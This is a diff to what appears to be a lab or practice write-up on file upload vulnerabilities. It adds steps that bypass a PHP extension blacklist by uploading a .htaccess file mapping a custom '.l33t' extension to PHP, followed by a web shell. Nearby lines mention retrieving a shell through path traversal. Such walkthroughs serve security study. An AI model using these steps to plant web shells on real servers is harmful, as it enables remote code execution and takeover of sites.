@@ -952,7 +952,11 @@ Now you can get your file with /files/avatars/../rce2.php
 .php is blacklisted, but you can set .phar extension  
 Also here be "correct" method using .htaccess method:
 ```
-COMES SOON
+1. Change filename to .htaccess
+2. Change Content-Type to `text/plain`
+3. Replace file contents with
+AddType application/x-httpd-php .l33t
+4. Upload shell with .l33t extension
 ```
 4. Web shell upload via obfuscated file extension
 ```
